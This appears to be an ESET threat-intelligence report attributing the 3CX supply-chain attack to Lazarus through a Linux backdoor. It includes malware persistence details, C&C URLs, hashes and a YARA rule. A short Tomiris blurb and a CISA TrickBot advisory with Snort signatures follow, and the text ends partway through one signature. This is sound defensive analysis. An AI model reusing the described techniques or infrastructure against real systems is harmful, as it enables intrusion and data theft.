The 3CX supply-chain attack 3CX is an international VoIP software developer and distributor that provides phone system services to many organizations.
According to its website, 3CX has more than 600,000 customers and 12,000,000 users in various sectors including aerospace, healthcare, and hospitality.
It provides client software to use its systems via a web browser, mobile app, or a desktop application.
Late in March 2023, it was discovered that the desktop application for both Windows and macOS contained malicious code that enabled a group of attackers to download and run arbitrary code on all machines where the application was installed.
Rapidly, it was determined that this malicious code was not something that 3CX added themselves, but that 3CX was compromised and that its software was used in a supply-chain attack driven by external threat actors to distribute additional malware to specific 3CX customers. 
This cyber-incident has made headlines in recent days.
Initially reported on March 29th, 2023 in a Reddit thread by a CrowdStrike engineer, followed by an official report by CrowdStrike, stating with high confidence that LABIRINTH CHOLLIMA, the company’s codename for Lazarus, was behind the attack (but omitting any evidence backing up the claim).
Because of the seriousness of the incident, multiple security companies started to contribute their summaries of the events, namely Sophos, Check Point, Broadcom, Trend Micro, and more. 
Further, the part of the attack affecting systems running macOS was covered in detail in a Twitter thread and a blogpost by Patrick Wardle. 
Timeline of events Figure 1.
Timeline of events related to the preparation and distribution of 3CX trojanized applications 
The timeline shows that the perpetrators had planned the attacks long before execution; as early as December 2022.
This suggests they already had a foothold inside 3CX’s network late last year. 
While the trojanized 3CX macOS application shows it was signed in late January, we did not see the bad application in our telemetry until February 14th, 2023.
It is unclear whether the malicious update for macOS was distributed prior to that date. 
Although ESET telemetry shows the existence of the macOS second-stage payload as early as February, we did not have the sample itself, nor metadata to tip us off about its maliciousness.
We include this information to help defenders determine how far back systems might have been compromised. 
Several days before the attack was publicly revealed, a mysterious Linux downloader was submitted to VirusTotal.
It downloads a new Lazarus malicious payload for Linux and we explain its relationship to the attack later in the text. 
Attribution of the 3CX supply-chain attack to Lazarus What is already published There is one domain that plays a significant role in our attribution reasoning: journalide[.]org.
It is mentioned in some of the vendor reports linked above, but its presence is never explained.
Interestingly, articles by SentinelOne and ObjectiveSee do not mention this domain.
Neither does a blogpost by Volexity, which even refrained from providing attribution, stating “Volexity cannot currently map the disclosed activity to any threat actor”.
Its analysts were among the first to investigate the attack in depth and they created a tool to extract a list of C&C servers from encrypted icons on GitHub.
This tool is useful, as the attackers did not embed the C&C servers directly in the intermediate stages, but rather used GitHub as a dead drop resolver.
The intermediate stages are downloaders for Windows and macOS that we denote as IconicLoaders, and the payloads they get as IconicStealer and UpdateAgent, respectively. 
On March 30th, Joe Desimone, a security researcher from Elastic Security, was among the first to provide, in a Twitter thread, substantial clues that the 3CX-driven compromises are probably linked to Lazarus.
He observed that a shellcode stub prepended to the payload from d3dcompiler_47.dll is similar to AppleJeus loader stubs attributed to Lazarus by CISA back in April 2021. 
On March 31st
it was being reported that 3CX had retained Mandiant to provide incident response services relating to the supply-chain attack. 
On April 3rd, Kaspersky, through its telemetry, showed a direct relationship between the 3CX supply-chain victims and the deployment of a backdoor dubbed Gopuram, both involving payloads with a common name, guard64.dll.
Kaspersky data shows that Gopuram is connected to Lazarus because it coexisted on victim machines alongside AppleJeus, malware that was already attributed to Lazarus.
Both Gopuram and AppleJeus were observed in attacks against a cryptocurrency company. 
Then, on April 11th, the CISO of 3CX summarized Mandiant’s interim findings in a blogpost.
According to that report, two Windows malware samples, a shellcode loader called TAXHAUL and a complex downloader named COLDCAT, were involved in the compromise of 3CX.
No hashes were provided, but Mandiant’s YARA rule, named TAXHAUL, also triggers on other samples already on VirusTotal: 
SHA-1: 2ACC6F1D4656978F4D503929B8C804530D7E7CF6 (ualapi.dll), SHA-1: DCEF83D8EE080B54DC54759C59F955E73D67AA65 (wlbsctrl.dll) The filenames, but not MD5s, of these samples coincide with those from Kaspersky’s blogpost.
However, 3CX explicitly states that COLDCAT differs from Gopuram. 
The next section contains a technical description of the new Lazarus malicious Linux payload we recently analyzed, as well as how it helped us strengthen the existing link between Lazarus and the 3CX compromise. 
Operation DreamJob with a Linux payload The Lazarus group’s Operation DreamJob involves approaching targets through LinkedIn and tempting them with job offers from industry leaders.
The name was coined by ClearSky in a paper published in August 2020.
That paper describes a Lazarus cyberespionage campaign targeting defense and aerospace companies.
The activity has overlap with what we call Operation In(ter)ception, a series of cyberespionage attacks that have been ongoing since at least September 2019.
It targets aerospace, military, and defense companies and uses specific malicious, initially Windows-only, tools.
During July and August 2022, we found two instances of Operation In(ter)ception targeting macOS.
One malware sample was submitted to VirusTotal from Brazil, and another attack targeted an ESET user in Argentina.
A few weeks ago, a native Linux payload was found on VirusTotal with an HSBC-themed PDF lure.
This completes Lazarus’s ability to target all major desktop operating systems. 
On March 20th, a user in the country of Georgia submitted to VirusTotal a ZIP archive called HSBC job offer.pdf.zip.
Given other DreamJob campaigns by Lazarus, this payload was probably distributed through spearphishing or direct messages on LinkedIn.
The archive contains a single file: a native 64-bit Intel Linux binary written in Go and named HSBC job offer․pdf. 
Interestingly, the file extension is not .pdf.
This is because the apparent dot character in the filename is a leader dot represented by the U+2024 Unicode character.
The use of the leader dot in the filename was probably an attempt to trick the file manager into treating the file as an executable instead of a PDF.
This could cause the file to run when double-clicked instead of opening it with a PDF viewer.
On execution, a decoy PDF is displayed to the user using xdg-open, which will open the document using the user’s preferred PDF viewer (see Figure 3).
We decided to call this ELF downloader OdicLoader, as it has a similar role as the IconicLoaders on other platforms and the payload is fetched from OpenDrive. 
OdicLoader drops a decoy PDF document, displays it using the system’s default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from the OpenDrive cloud service.
The downloaded file is stored in ~/.config/guiconfigd (SHA-1: 0CA1723AFE261CD85B05C9EF424FC50290DCE7DF).
We call this second-stage backdoor SimplexTea. 
As the last step of its execution, the OdicLoader modifies ~/.bash_profile, so SimplexTea is launched with Bash and its output is muted (~/.config/guiconfigd >/dev/null 2>&1). 
Figure 2.
Illustration of the probable chain of compromise Figure 3.
An HSBC-themed lure in the Linux DreamJob campaign SimplexTea is a Linux backdoor written in C++.
As highlighted in Table 1, its class names are very similar to function names found in a sample, with filename sysnetd, submitted to VirusTotal from Romania (SHA-1: F6760FB1F8B019AF2304EA6410001B63A1809F1D).
Because of the similarities in class names and function names between SimplexTea and sysnetd, we believe SimplexTea is an updated version, rewritten from C to C++. 
Table 1.
Comparison of the original symbol names from two Linux backdoors submitted to VirusTotal guiconfigd (SimplexTea for Linux, from Georgia)sysnetd (BADCALL for Linux, from Romania) CMsgCmd::Start(void)MSG_Cmd CMsgSecureDel::Start(void)MSG_Del CMsgDir::Start(void)MSG_Dir CMsgDown::Start(void)MSG_Down CMsgExit::Start(void)MSG_Exit CMsgReadConfig::Start(void)MSG_ReadConfig CMsgRun::Start(void)MSG_Run CMsgSetPath::Start(void)MSG_SetPath CMsgSleep::Start(void)MSG_Sleep CMsgTest::Start(void)MSG_Test CMsgUp::Start(void)MSG_Up CMsgWriteConfig::Start(void)MSG_WriteConfig MSG_GetComInfo CMsgHibernate::Start(void) CMsgKeepCon::Start(void) CMsgZipDown::Start(void) 
CMsgZip::StartZip(void *) CMsgZip::Start(void) CHttpWrapper::RecvData(uchar *&,uint *,uint,signed char) RecvMsg CHttpWrapper::SendMsg(_MSG_STRUCT *)SendMsg CHttpWrapper::SendData(uchar *,uint,uint) CHttpWrapper::SendMsg(uint,uint,uchar *,uint,uint) 
CHttpWrapper::SendLoginData(uchar *,uint,uchar *&,uint *) 
How is sysnetd related to Lazarus?
The following section shows similarities with Lazarus’s Windows backdoor called BADCALL. 
BADCALL for Linux We attribute sysnetd to Lazarus because of its similarities with the following two files (and we believe that sysnetd is a Linux variant of the group’s backdoor for Windows called BADCALL): 
P2P_DLL.dll (SHA-1: 65122E5129FC74D6B5EBAFCC3376ABAE0145BC14), which shows code similarities to sysnetd in the form of domains used as a front for fake TLS connection (see Figure 4).
It was attributed to Lazarus by CISA in December 2017.
From September 2019, CISA started to call newer versions of this malware BADCALL (SHA-1: D288766FA268BC2534F85FD06A5D52264E646C47). 
Figure 4.
Similarities between a Windows and a Linux variant of BADCALL (a list of domains used as a front for a fake TLS connection) prtspool (SHA-1: 58B0516D28BD7218B1908FB266B8FE7582E22A5F), which shows code similarities to sysnetd (see Figure 5).
It was attributed to Lazarus by CISA in February 2021.
Note as well that SIMPLESEA, a macOS backdoor found during the 3CX incident response, implements the A5/1 stream cipher. 
Figure 5.
Similarities between AppleJeus for macOS and the Linux variant of BADCALL (the key for the A5/1 stream cipher) 
This Linux version of the BADCALL backdoor, sysnetd, loads its configuration from a file named /tmp/vgauthsvclog.
Since Lazarus operators have previously disguised their payloads, the use of this name, which is used by the VMware Guest Authentication service, suggests that the targeted system may be a Linux VMware virtual machine.
Interestingly, the XOR key in this case is the same as one used in SIMPLESEA from the 3CX investigation. 
Figure 6.
Loading a configuration file by BADCALL for Linux, cf.
Figure 8 Taking a look at the three 32-bit integers, 0xC2B45678, 0x90ABCDEF, and 0xFE268455 from Figure 5, which represent a key for a custom implementation of the A5/1 cipher, we realized that the same algorithm and the identical keys were used in Windows malware that dates back to the end of 2014 and was involved in one of the most notorious Lazarus cases: the cybersabotage of Sony Pictures Entertainment (SHA-1: 1C66E67A8531E3FF1C64AE57E6EDFDE7BEF2352D). 
Figure 7.
The decryption routine shared between the BADCALL for Linux and targeted destructive malware for Windows from 2014 Additional attribution data points To recap what we’ve covered so far, we attribute the 3CX supply-chain attack to the Lazarus group with a high level of confidence.
This is based on the following factors: Malware (the intrusion set): The IconicLoader (samcli.dll) uses the same type of strong encryption – AES-GCM – as SimplexTea (whose attribution to Lazarus was established via the similarity with BALLCALL for Linux); only the keys and initialization vectors differ. 
Based on the PE Rich Headers, both IconicLoader (samcli.dll) and IconicStealer (sechost.dll) are projects of a similar size and compiled in the same Visual Studio environment as the executables iertutil.dll (SHA-1: 5B03294B72C0CAA5FB20E7817002C600645EB475) and iertutil.dll (SHA-1: 7491BD61ED15298CE5EE5FFD01C8C82A2CDB40EC) reported in the Lazarus cryptocurrency campaigns by Volexity and Microsoft.
We include below the YARA rule RichHeaders_Lazarus_NukeSped_IconicPayloads_3CX_Q12023, which flags all these samples, and no unrelated malicious or clean files, as tested on the current ESET databases and recent VirusTotal submissions. 
SimplexTea payload loads its configuration in a very similar way to the SIMPLESEA malware from the 3CX official incident response.
The XOR key differs (0x5E vs. 0x7E), but the configuration bears the same name: apdl.cf (see Figure 8). Figure 8.
Loading a configuration file by SimplexTea for Linux, cf.
Figure 6 Infrastructure: There is shared network infrastructure with SimplexTea, as it uses https://journalide[.]org/djour.php as it C&C, whose domain is reported in the official results of the incident response of the 3CX compromise by Mandiant. 
Figure 9.
A hardcoded URL in SimplexTea for Linux Conclusion The 3CX compromise has gained a lot of attention from the security community since its disclosure on March 29th.
This compromised software, deployed on various IT infrastructures, which allows the download and execution of any kind of payload, can have devastating impacts.
Unfortunately, no software publisher is immune to being compromised and inadvertently distributing trojanized versions of their applications. 
The stealthiness of a supply-chain attack makes this method of distributing malware very appealing from an attacker’s perspective.
Lazarus has already used this technique in the past, targeting South Korean users of WIZVERA VeraPort software in 2020.
Similarities with existing malware from the Lazarus toolset and with the group’s typical techniques strongly suggest the recent 3CX compromise is the work of Lazarus as well. 
It is also interesting to note that Lazarus can produce and use malware for all major desktop operating systems: Windows, macOS, and Linux.
Both Windows and macOS systems were targeted during the 3CX incident, with 3CX’s VoIP software for both operating systems being trojanized to include malicious code to fetch arbitrary payloads.
In the case of 3CX, both Windows and macOS second-stage malware versions exist.
This article demonstrates the existence of a Linux backdoor that probably corresponds to the SIMPLESEA macOS malware seen in the 3CX incident.
We named this Linux component SimplexTea and showed that it is part of Operation DreamJob, Lazarus’s flagship campaign using job offers to lure and compromise unsuspecting victims. 
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. ESET Research offers private APT intelligence reports and data feeds.
For any inquiries about this service, visit the ESET Threat Intelligence page. 
IoCs Files SHA-1FilenameESET detection nameDescription 0CA1723AFE261CD85B05C9EF424FC50290DCE7DFguiconfigdLinux/NukeSped.
ESimplexTea for Linux. 
3A63477A078CE10E53DFB5639E35D74F93CEFA81HSBC_job_offer․pdfLinux/NukeSped.
EOdicLoader, a 64-bit downloader for Linux, written in Go. 9D8BADE2030C93D0A010AA57B90915EB7D99EC82HSBC_job_offer.pdf.zipLinux/NukeSped.
EA ZIP archive with a Linux payload, from VirusTotal. 
F6760FB1F8B019AF2304EA6410001B63A1809F1DsysnetdLinux/NukeSped.
GBADCALL for Linux. 
First seen2023-03-20 12:00:35 MD5CEDB9CDBAD254F60CFB215B9BFF84FB9 SHA-10CA1723AFE261CD85B05C9EF424FC50290DCE7DF SHA-256EEBB01932DE0B5605DD460CC82844D8693C00EA8AB5FFDF8DBEDE6528C1C18FD Filenameguiconfigd DescriptionSimplexTea for Linux. 
C&Chttps://journalide[.]org/djour.php Downloaded fromhttps://od[.]lk/d/NTJfMzg4MDE1NzJf/vxmedia DetectionLinux/NukeSped.
E PE compilation timestampN/A 
First seen2023-03-16 07:44:18 MD53CF7232E5185109321921046D039CF10 SHA-13A63477A078CE10E53DFB5639E35D74F93CEFA81 SHA-256492A643BD1EFDACA4CA125ADE1B606E7BBF00E995AC9115AC84D1C4C59CB66DD FilenameHSBC_job_offer․pdf DescriptionOdicLoader, a 64-bit downloader for Linux, in Go. C&Chttps://od[.]lk/d/NTJfMzg4MDE1NzJf/vxmedia Downloaded fromN/A DetectionLinux/NukeSped.
First seen2023-03-20 02:23:29 MD5FC41CB8425B6432AF8403959BB59430D SHA-19D8BADE2030C93D0A010AA57B90915EB7D99EC82 SHA-256F638E5A20114019AD066DD0E856F97FD865798D8FBED1766662D970BEFF652CA FilenameHSBC_job_offer.pdf.zip DescriptionA ZIP archive with a Linux payload, from VirusTotal. 
C&CN/A Downloaded fromN/A DetectionLinux/NukeSped.
First seen2023-02-01 23:47:05 MD5AAC5A52B939F3FE792726A13FF7A1747 SHA-1F6760FB1F8B019AF2304EA6410001B63A1809F1D SHA-256CC307CFB401D1AE616445E78B610AB72E1C7FB49B298EA003DD26EA80372089A Filenamesysnetd DescriptionBADCALL for Linux. 
C&Ctcp://23.254.211[.]230 Downloaded fromN/A DetectionLinux/NukeSped.
G PE compilation timestampN/A Network IP addressDomainHosting providerFirst seenDetails 23.254.211[.]230N/AHostwinds LLC.N/AC&C server for BADCALL for Linux 38.108.185[.]7938.108.185[.]115od[.]lkCogent Communications2023-03-16Remote OpenDrive storage containing SimplexTea (/d/NTJfMzg4MDE1NzJf/vxmedia) 172.93.201[.]88journalide[.]orgNexeon Technologies, Inc.2023-03-29C&C server for SimplexTea (/djour.php) MITRE ATT&CK techniques TacticIDNameDescription ReconnaissanceT1593.001Search Open Websites/Domains: Social MediaLazarus attackers probably approached a target with a fake HSBC-themed job offer that would fit the target’s interest.
This has been done mostly via LinkedIn in the past. 
Resource DevelopmentT1584.001Acquire Infrastructure:
DomainsUnlike many previous cases of compromised C&Cs used in Operation DreamJob, Lazarus operators registered their own domain for the Linux target. 
T1587.001Develop Capabilities: MalwareCustom tools from the attack are very likely developed by the attackers. 
T1585.003Establish Accounts: Cloud AccountsThe attackers hosted the final stage on the cloud service OpenDrive. 
T1608.001Stage Capabilities: Upload MalwareThe attackers hosted the final stage on the cloud service OpenDrive. 
ExecutionT1204.002User
Execution: Malicious FileOdicLoader masquerades as a PDF file in order to fool the target. 
Initial AccessT1566.002Phishing: Spearphishing LinkThe target likely received a link to third-party remote storage with a malicious ZIP archive, which was later submitted to VirusTotal. 
PersistenceT1546.004Event Triggered Execution: Unix Shell Configuration ModificationOdicLoader modifies the victim’s Bash profile, so SimplexTea is launched each time Bash is stared and its output is muted. 
Defense EvasionT1134.002Access Token Manipulation: Create Process with TokenSimplexTea can create a new process, if instructed by its C&C server. 
T1140Deobfuscate/Decode Files or InformationSimplexTea stores its configuration in an encrypted apdl.cf. T1027.009Obfuscated Files or Information: Embedded PayloadsThe droppers of all malicious chains contain an embedded data array with an additional stage. 
T1562.003Impair Defenses: Impair Command History LoggingOdicLoader modifies the victim’s Bash profile, so the output and error messages from SimplexTea are muted.
SimplexTea executes new processes with the same technique. 
T1070.004Indicator Removal: File DeletionSimplexTea has the ability to delete files securely. 
T1497.003Virtualization/Sandbox Evasion: Time Based EvasionSimplexTea implements multiple custom sleep delays in its execution. 
DiscoveryT1083File and Directory DiscoverySimplexTea can list the directory content together with their names, sizes, and timestamps (mimicking the ls -la command). 
Command and ControlT1071.001Application Layer Protocol: Web ProtocolsSimplexTea can use HTTP and HTTPS for communication with its C&C server, using a statically linked Curl library. 
T1573.001Encrypted Channel:
Symmetric CryptographySimplexTea encrypts C&C traffic using the AES-GCM algorithm. 
T1132.001Data Encoding: Standard EncodingSimplexTea encodes C&C traffic using base64. 
T1090ProxySimplexTea can utilize a proxy for communications. 
ExfiltrationT1041Exfiltration
Over C2 ChannelSimplexTea can exfiltrate data as ZIP archives to its C&C server. 
Appendix This YARA rule flags the cluster containing both IconicLoader and IconicStealer, as well as the payloads deployed in the cryptocurrency campaigns from December 2022. 123456789101112131415161718192021 /*The following rule will only work with YARA version >= 3.11.0*/import "pe"rule RichHeaders_Lazarus_NukeSped_IconicPayloads_3CX_Q12023{ meta: description = " Rich Headers-based rule covering the IconicLoader and IconicStealer from the 3CX supply chain incident, and also payloads from the cryptocurrency campaigns from 2022-12" author = "ESET Research" date = "2023-03-31" hash = "3B88CDA62CDD918B62EF5AA8C5A73A46F176D18B" hash = "CAD1120D91B812ACAFEF7175F949DD1B09C6C21A" hash = "5B03294B72C0CAA5FB20E7817002C600645EB475" hash = "7491BD61ED15298CE5EE5FFD01C8C82A2CDB40EC" condition: pe.rich_signature.toolid(259, 30818) == 9 and pe.rich_signature.toolid(256, 31329) == 1 and pe.rich_signature.toolid(261, 30818) >= 30 and pe.rich_signature.toolid(261, 30818) <
= 38 and pe.rich_signature.toolid(261, 29395)
>= 134 and pe.rich_signature.toolid(261, 29395)
<= 164 and pe.rich_signature.toolid(257, 29395)
>= 6 and pe.rich_signature.toolid(257, 29395)
<= 14} 20 Apr 2023 - 11:30AM 
title: Tomiris called, they want their Turla malware back\nurl: https://securelist.com/tomiris-called-they-want-their-turla-malware-back/109552/\n\nWe continued to track Tomiris as a separate threat actor over three new attack campaigns between 2021 and 2023, and our telemetry allowed us to shed light on the group.
In this blog post, we’re excited to share what we now know of Tomiris with the broader community, and discuss further evidence of a possible connection to Turla.\n
title: AA21-076A: TrickBot Malware url: https://us-cert.cisa.gov/ncas/alerts/aa21-076a Original release date: March 17, 2021 | Last revised: May 20, 2021SummaryThis Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK:registered:) framework, Version 8.
See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques. 
The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) have observed continued targeting through spearphishing campaigns using TrickBot malware in North America.
A sophisticated group of cybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot. 
TrickBot—first identified in 2016—is a Trojan developed and operated by a sophisticated group of cybercrime actors.
Originally designed as a banking Trojan to steal financial data, TrickBot has evolved into highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. 
To secure against TrickBot, CISA and FBI recommend implementing the mitigation measures described in this Joint Cybersecurity Advisory, which include blocking suspicious Internet Protocol addresses, using antivirus software, and providing social engineering and phishing training to employees. 
Click here for a PDF version of this report. 
Technical DetailsTrickBot is an advanced Trojan that malicious actors spread primarily by spearphishing campaigns using tailored emails that contain malicious attachments or links, which—if enabled—execute malware (Phishing:
Spearphishing Attachment
[T1566.001],
Phishing: Spearphishing Link
[T1566.002]).
CISA and FBI are aware of recent attacks that use phishing emails, claiming to contain proof of a traffic violation, to steal sensitive information.
The phishing emails contain links that redirect to a website hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation.
(User Execution: Malicious Link [T1204.001], User Execution: Malicious File [T1204.002]).
In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s command and control (C2) server to download TrickBot to the victim’s system (Command and Scripting Interpreter:
JavaScript [T1059.007]). 
Attackers can use TrickBot to: Drop other malware, such as Ryuk and Conti ransomware, or Serve as an Emotet downloader (Ingress Tool Transfer [T1105]).[1] TrickBot uses person-in-the-browser attacks to steal information, such as login credentials (Man in the Browser
[T1185]).
Additionally, some of TrickBot’s modules spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol.
TrickBot operators have a toolset capable of spanning the entirety of the MITRE ATT&CK framework, from actively or passively gathering information that can be used to support targeting (Reconnaissance [TA0043]), to trying to manipulate, interrupt, or destroy systems and data (Impact [TA0040]). 
TrickBot is capable of data exfiltration over a hardcoded C2 server, cryptomining, and host enumeration (e.g., reconnaissance of Unified Extensible Firmware Interface or Basic Input/Output System [UEFI/BIOS] firmware) (Exfiltration Over C2 Channel
[T1041], Resource Hijacking [T1496], System Information Discovery.[2]
For host enumeration, operators deliver TrickBot in modules containing a configuration file with specific tasks. 
Figure 1 lays out TrickBot’s use of enterprise techniques. Figure 1: MITRE ATT&CK enterprise techniques used by TrickBot MITRE ATT&CK Techniques According to MITRE, TrickBot [S0266] uses the ATT&CK techniques listed in table 1. Table 1: TrickBot ATT&CK techniques for
enterprise Initial Access
[TA0001] Technique Title ID Use Phishing:
Spearphishing Attachment T1566.001 TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware. 
Phishing: Spearphishing Link T1566.002 TrickBot has been delivered via malicious links in phishing emails. 
Execution [TA0002] Technique Title ID Use Scheduled Task/Job: Scheduled
Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. 
Command and Scripting Interpreter:
Windows Command Shell T1059.003 TrickBot has used macros in Excel documents to download and deploy the malware on the user’s machine. Command and Scripting Interpreter: JavaScript/JScript T1059.007 TrickBot victims unknowingly download a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s C2 server to download TrickBot to the victim’s system. 
Native API T1106 TrickBot uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow. 
User Execution: Malicious Link T1204.001 TrickBot has sent spearphishing emails in an attempt to lure users to click on a malicious link. 
User Execution: Malicious File T1204.002 TrickBot has attempted to get users to launch malicious documents to deliver its payload. 
Persistence [TA0003] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. 
Create or Modify System Process:
Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. Privilege Escalation
[TA0004] Technique Title ID Use Scheduled Task/Job: Scheduled
Process Injection: Process Hollowing T1055.012 TrickBot injects into the svchost.exe process. 
Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. 
Defense Evasion
[TA0005] Technique Title ID Use Obfuscated Files or Information T1027 TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files. 
Obfuscated Files or Information: Software Packing T1027.002 TrickBot leverages a custom packer to obfuscate its functionality. 
Masquerading T1036 The TrickBot downloader has used an icon to appear as a Microsoft Word document. 
Modify Registry T1112 TrickBot can modify registry entries. 
Deobfuscate/Decode Files or Information T1140 TrickBot decodes the configuration data and modules. 
Subvert Trust Controls: Code Signing T1553.002 TrickBot has come with a signed downloader component. 
Impair Defenses: Disable or Modify Tools T1562.001 TrickBot can disable Windows Defender. 
Credential Access
[TA0006] Technique Title ID Use Input Capture: Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. 
Unsecured Credentials: Credentials in Files T1552.001 TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP.
Additionally, it searches for the .vnc.lnk affix to steal VNC credentials. 
Unsecured Credentials: Credentials in Registry T1552.002 TrickBot has retrieved PuTTY credentials by querying the Software\SimonTatham\Putty\Sessions registry key. Credentials from Password Stores T1555 TrickBot can steal passwords from the KeePass open-source password manager. Credentials from Password Stores: Credentials from Web Browsers T1555.003 TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl. 
Discovery [TA0007] Technique Tactic ID Use System Service Discovery T1007 TrickBot collects a list of install programs and services on the system’s machine. 
System Network Configuration Discovery T1016 TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine. 
Remote System Discovery T1018 TrickBot can enumerate computers and network devices. 
System Owner/User Discovery T1033 TrickBot can identify the user and groups the user belongs to on a compromised host. 
Permission Groups Discovery T1069 TrickBot can identify the groups the user on a compromised host belongs to. 
System Information Discovery T1082 TrickBot gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine. 
File and Directory Discovery T1083 TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.
It can also obtain browsing history, cookies, and plug-in information. 
Account Discovery: Local Account T1087.001 TrickBot collects the users of the system. 
Account Discovery: Email Account T1087.003 TrickBot collects email addresses from Outlook. 
Domain Trust Discovery T1482 TrickBot can gather information about domain trusts by utilizing Nltest. 
Lateral Movement [TA0008] Technique Tactic ID Use Lateral Tool Transfer T1570 Some TrickBot modules spread the malware laterally across a network by abusing the SMB Protocol. 
Collection [TA0009] Technique Tactic ID Use Data from Local System T1005 TrickBot collects local files and information from the victim’s local machine. 
Input Capture:Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. Person in the Browser T1185 TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage. Command and Control
[TA0011] Technique Tactic ID Use Fallback Channels T1008 TrickBot can use secondary command and control (C2) servers for communication after establishing connectivity and relaying victim information to primary C2 servers. 
Application Layer Protocol: Web Protocols T1071.001 TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files. 
Ingress Tool Transfer T1105 TrickBot downloads several additional files and saves them to the victim's machine. 
Data Encoding: Standard Encoding T1132.001 TrickBot can Base64-encode C2 commands. 
Non-Standard Port T1571 Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. 
Encrypted Channel:
Symmetric Cryptography T1573.001 TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic. 
Exfiltration [TA0010] Technique Tactic ID Use Exfiltration Over C2 Channel T1041 TrickBot can send information about the compromised host to a hardcoded C2 server. 
Impact [TA0040] Technique Tactic ID Use Resource Hijacking T1496 TrickBot actors can leverage the resources of co-opted systems for cryptomining to validate transactions of cryptocurrency networks and earn virtual currency. 
Detection Signatures CISA developed the following snort signature for use in detecting network activity associated with TrickBot activity. 
alert tcp any [443,447] -> any any (msg:"TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'example.com' (Hex)"; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:"|0b|example.com"; fast_pattern:only; content:"Global Security"; content:"IT Department"; pcre:"/(?:\x09\x00\xc0\xb9\x3b\x93\x72\xa3\xf6\xd2|\x00\xe2\x08\xff\xfb\x7b\x53\x76\x3d)/"; classtype:bad-unknown; metadata:service ssl,service and-ports;) alert tcp any any -> any $HTTP_PORTS (msg:"TRICKBOT_ANCHOR:HTTP URI GET contains '/anchor'"; sid:1; rev:1; flow:established,to_server; content:"/anchor"; http_uri; fast_pattern:only; content:"GET"; nocase; http_method; pcre:"/^\/anchor_?.{3}\/[\w_-]+\.[A-F0-9]+\/?$/U"; classtype:bad-unknown; priority:1; metadata:service http;) alert tcp any $SSL_PORTS -> any any (msg:"TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'C=XX, L=Default City, O=Default Company Ltd'"; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:"|31 0b 30 09 06 03 55 04 06 13 02|XX"; nocase; content:"|31 15 30 13 06 03 55 04 07 13 0c|Default City"; nocase; content:"|31 1c 30 1a 06 03 55 04 0a 13 13|Default Company Ltd"; nocase; content:!"|31 0c 30 0a 06 03 55 04 03|"; classtype:bad-unknown; reference:url,www.virustotal.com/gui/file/e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e/detection; metadata:service ssl;) alert tcp any any -> any $HTTP_PORTS (msg:"TRICKBOT:HTTP Client Header contains 'boundary=Arasfjasu7'"; sid:1; rev:1; flow:established,to_server; content:"boundary=Arasfjasu7|0d 0a|"; http_header; content:"name=|22|proclist|22|"; http_header; content:!"Referer"; content:!"Accept"; content:"POST"; http_method; classtype:bad-unknown; metadata:service http;) alert tcp any any -> any $HTTP_PORTS (msg:"TRICKBOT:HTTP Client Header contains 'User-Agent|3a 20|WinHTTP loader/1.'
